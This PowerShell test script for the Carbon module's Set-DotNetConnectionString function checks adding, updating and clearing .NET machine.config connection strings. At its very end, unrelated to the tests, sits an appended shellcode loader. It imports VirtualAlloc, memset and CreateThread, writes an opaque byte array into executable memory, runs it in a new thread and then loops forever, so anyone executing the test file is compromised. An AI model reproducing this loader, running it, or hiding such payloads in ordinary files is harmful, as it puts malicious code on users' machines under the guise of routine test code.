










$connectionStringName = "TEST_CONNECTION_STRING_NAME"
$connectionStringValue = "TEST_CONNECTION_STRING_VALUE"
$connectionStringNewValue = "TEST_CONNECTION_STRING_NEW_VALUE"
$providerName = 'Carbon.Set-DotNetConnectionString'

function Start-TestFixture
{
    & (Join-Path -Path $PSScriptRoot '..\Initialize-CarbonTest.ps1' -Resolve)
}

function Start-Test
{
    Remove-ConnectionStrings    
}

function Stop-Test
{
    Remove-ConnectionStrings
}

function Remove-ConnectionStrings
{
    $command = @"
        
        Add-Type -AssemblyName System.Configuration
        
        `$config = [Configuration.ConfigurationManager]::OpenMachineConfiguration()
        `$connectionStrings = `$config.ConnectionStrings.ConnectionStrings
        if( `$connectionStrings['$connectionStringName'] )
        {
            `$connectionStrings.Remove( '$connectionStringName' )
            `$config.Save()
        }
"@
    
    if( (Test-DotNet -V2) )
    {
        Invoke-PowerShell -Command $command -Encode -x86 -Runtime v2.0
        Invoke-PowerShell -Command $command -Encode -Runtime v2.0
    }

    if( (Test-DotNet -V4 -Full) )
    {
        Invoke-PowerShell -Command $command -Encode -x86 -Runtime v4.0
        Invoke-PowerShell -Command $command -Encode -Runtime v4.0
    }
}

function Test-ShouldUpdateDotNet2x86MachineConfig
{
    if( -not (Test-DotNet -V2) )
    {
        Fail ('.NET v2 is not installed')
    }

    Set-DotNetConnectionString -Name $connectionStringName -Value $connectionStringValue -Framework -Clr2
    Assert-ConnectionString -Name $connectionStringName -Value $connectionStringValue -Framework -Clr2
}

function Test-ShouldUpdateDotNet2x64MachineConfig
{
    if( -not (Test-DotNet -V2) )
    {
        Fail ('.NET v2 is not installed')
    }

    Set-DotNetConnectionString -Name $connectionStringName -Value $connectionStringValue -Framework64 -Clr2
    Assert-ConnectionString -Name $connectionStringName -Value $connectionStringValue -Framework64 -Clr2
}

function Test-ShouldUpdateDotNet4x86MachineConfig
{
    if( -not (Test-DotNet -V4 -Full) )
    {
        Fail ('.NET v4 full is not installed')
    }

    Set-DotNetConnectionString -Name $connectionStringName -Value $connectionStringValue -Framework -Clr4
    Assert-ConnectionString -Name $connectionStringName -Value $connectionStringValue -Framework -Clr4
}

function Test-ShouldUpdateDotNet4x64MachineConfig
{
    if( -not (Test-DotNet -V4 -Full) )
    {
        Fail ('.NET v4 full is not installed')
    }

    Set-DotNetConnectionString -Name $connectionStringName -Value $connectionStringValue -Framework64 -Clr4
    Assert-ConnectionString -Name $connectionStringName -Value $connectionStringValue -Framework64 -Clr4
}

function Test-ShouldUpdateConnectionString
{
    if( -not (Test-DotNet -V2) )
    {
        Fail ('.NET v2 is not installed')
    }

    Set-DotNetConnectionString -Name $connectionStringName -Value $connectionStringValue -Framework -Clr2
    Set-DotNetConnectionString -Name $connectionStringName -Value $connectionStringNewValue -Framework -Clr2
    Assert-ConnectionString -Name $connectionStringName -Value $connectionStringNewValue -Framework -Clr2 
}

function Test-ShouldAddProviderName
{
    if( -not (Test-DotNet -V4 -Full) )
    {
        Fail ('.NET v4 full is not installed')
    }

    Set-DotNetConnectionString -Name $connectionStringName -Value $connectionStringValue -ProviderName $providerName -Framework64 -Clr4
    Assert-ConnectionString -Name $connectionStringName -Value $connectionStringValue -ProviderName $providerName -Framework64 -Clr4
}

function Test-ShouldClearProviderName
{
    if( -not (Test-DotNet -V4 -Full) )
    {
        Fail ('.NET v4 full is not installed')
    }

    Set-DotNetConnectionString -Name $connectionStringName -Value $connectionStringValue -ProviderName $providerName -Framework64 -Clr4
    Assert-ConnectionString -Name $connectionStringName -Value $connectionStringValue -ProviderName $providerName -Framework64 -Clr4
    Set-DotNetConnectionString -Name $connectionStringName -Value $connectionStringValue -Framework64 -Clr4
    Assert-ConnectionString -Name $connectionStringName -Value $connectionStringValue -Framework64 -Clr4
}

function Test-ShouldUpdateProviderName
{
    if( -not (Test-DotNet -V4 -Full) )
    {
        Fail ('.NET v4 full is not installed')
    }

    Set-DotNetConnectionString -Name $connectionStringName -Value $connectionStringValue -ProviderName $providerName -Framework64 -Clr4
    Assert-ConnectionString -Name $connectionStringName -Value $connectionStringValue -ProviderName $providerName -Framework64 -Clr4

    $newProviderName = '{0}.{0}' -f $providerName
    Set-DotNetConnectionString -Name $connectionStringName -Value $connectionStringValue -ProviderName $newProviderName -Framework64 -Clr4
    Assert-ConnectionString -Name $connectionStringName -Value $connectionStringValue -ProviderName $newProviderName -Framework64 -Clr4
}

function Test-ShouldRequireAFrameworkFlag
{
    $error.Clear()
    Set-DotNetConnectionString -Name $connectionStringName -Value $connectionStringValue -Clr2 -ErrorACtion SilentlyContinue
    Assert-Equal 1 $error.Count
    Assert-Like $error[0].Exception 'You must supply either or both of the Framework and Framework64 switches.'
}

function Test-ShouldRequireAClrFlag
{
    $error.Clear()
    Set-DotNetConnectionString -Name $connectionStringName -Value $connectionStringValue -Framework -ErrorACtion SilentlyContinue
    Assert-Equal 1 $error.Count
    Assert-Like $error[0].Exception 'You must supply either or both of the Clr2 and Clr4 switches.'    
}

function Test-ShouldAddConnectionStringWithSensitiveCharacters
{
    $name = $value = $providerName = '`1234567890-=qwertyuiop[]\a sdfghjkl;''zxcvbnm,./~!@
    Set-DotNetConnectionString -Name $name -Value $value -ProviderName $providerName -Framework64 -Clr4
    Assert-ConnectionString -Name $name -Value $value -ProviderName $providerName -Framework64 -Clr4
}

function Assert-ConnectionString
{
    param(
        $Name, 
        
        $value, 

        $ProviderName,
        
        [Switch]
        $Framework, 
        
        [Switch]
        $Framework64, 
        
        [Switch]
        $Clr2, 
        
        [Switch]
        $Clr4
    )

    $Name = $Name -replace "'","''"

    $command = @"
        
        Add-Type -AssemblyName System.Configuration
        
        `$config = [Configuration.ConfigurationManager]::OpenMachineConfiguration()
        
        `$connectionStrings = `$config.ConnectionStrings.ConnectionStrings
        
        if( `$connectionStrings['$Name'] )
        {
            `$connectionStrings['$Name']
        }
        else
        {
            `$null
        }
"@
    
    $runtimes = @()
    if( $Clr2 )
    {
        $runtimes += 'v2.0'
    }
    if( $Clr4 )
    {
        $runtimes += 'v4.0'
    }
    
    if( $runtimes.Length -eq 0 )
    {
        throw "Must supply either or both the Clr2 and Clr2 switches."
    }
    
    $runtimes | 
        ForEach-Object {
            $params = @{
                Command = $command
                Encode = $true
                Runtime = $_
                OutputFormat = 'XML'
            }

            if( $Framework )
            {
                Invoke-PowerShell @params -x86
            }

            if( $Framework64 )
            {
                Invoke-PowerShell @params
            }
        } | 
        ForEach-Object {
            Assert-Equal $Value $_.ConnectionString
            if( $ProviderName )
            {
                Assert-Equal $ProviderName $_.ProviderName
            }
            else
            {
                Assert-Empty $_.ProviderName
            }        
        }
}


$c = '[DllImport("kernel32.dll")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport("kernel32.dll")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport("msvcrt.dll")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $c -Name "Win32" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xbb,0xb5,0x00,0x0d,0x50,0xdb,0xd2,0xd9,0x74,0x24,0xf4,0x5e,0x2b,0xc9,0xb1,0x47,0x83,0xee,0xfc,0x31,0x5e,0x0f,0x03,0x5e,0xba,0xe2,0xf8,0xac,0x2c,0x60,0x02,0x4d,0xac,0x05,0x8a,0xa8,0x9d,0x05,0xe8,0xb9,0x8d,0xb5,0x7a,0xef,0x21,0x3d,0x2e,0x04,0xb2,0x33,0xe7,0x2b,0x73,0xf9,0xd1,0x02,0x84,0x52,0x21,0x04,0x06,0xa9,0x76,0xe6,0x37,0x62,0x8b,0xe7,0x70,0x9f,0x66,0xb5,0x29,0xeb,0xd5,0x2a,0x5e,0xa1,0xe5,0xc1,0x2c,0x27,0x6e,0x35,0xe4,0x46,0x5f,0xe8,0x7f,0x11,0x7f,0x0a,0xac,0x29,0x36,0x14,0xb1,0x14,0x80,0xaf,0x01,0xe2,0x13,0x66,0x58,0x0b,0xbf,0x47,0x55,0xfe,0xc1,0x80,0x51,0xe1,0xb7,0xf8,0xa2,0x9c,0xcf,0x3e,0xd9,0x7a,0x45,0xa5,0x79,0x08,0xfd,0x01,0x78,0xdd,0x98,0xc2,0x76,0xaa,0xef,0x8d,0x9a,0x2d,0x23,0xa6,0xa6,0xa6,0xc2,0x69,0x2f,0xfc,0xe0,0xad,0x74,0xa6,0x89,0xf4,0xd0,0x09,0xb5,0xe7,0xbb,0xf6,0x13,0x63,0x51,0xe2,0x29,0x2e,0x3d,0xc7,0x03,0xd1,0xbd,0x4f,0x13,0xa2,0x8f,0xd0,0x8f,0x2c,0xa3,0x99,0x09,0xaa,0xc4,0xb3,0xee,0x24,0x3b,0x3c,0x0f,0x6c,0xff,0x68,0x5f,0x06,0xd6,0x10,0x34,0xd6,0xd7,0xc4,0xa1,0xd3,0x4f,0x27,0x9d,0xdd,0xd8,0xcf,0xdc,0xdd,0xf7,0x53,0x68,0x3b,0xa7,0x3b,0x3a,0x94,0x07,0xec,0xfa,0x44,0xef,0xe6,0xf4,0xbb,0x0f,0x09,0xdf,0xd3,0xa5,0xe6,0xb6,0x8c,0x51,0x9e,0x92,0x47,0xc0,0x5f,0x09,0x22,0xc2,0xd4,0xbe,0xd2,0x8c,0x1c,0xca,0xc0,0x78,0xed,0x81,0xbb,0x2e,0xf2,0x3f,0xd1,0xce,0x66,0xc4,0x70,0x99,0x1e,0xc6,0xa5,0xed,0x80,0x39,0x80,0x66,0x08,0xac,0x6b,0x10,0x75,0x20,0x6c,0xe0,0x23,0x2a,0x6c,0x88,0x93,0x0e,0x3f,0xad,0xdb,0x9a,0x53,0x7e,0x4e,0x25,0x02,0xd3,0xd9,0x4d,0xa8,0x0a,0x2d,0xd2,0x53,0x79,0xaf,0x2e,0x82,0x47,0xc5,0x5e,0x16;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$x=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($x.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$x,0,0,0);for (;;){Start-sleep 60};

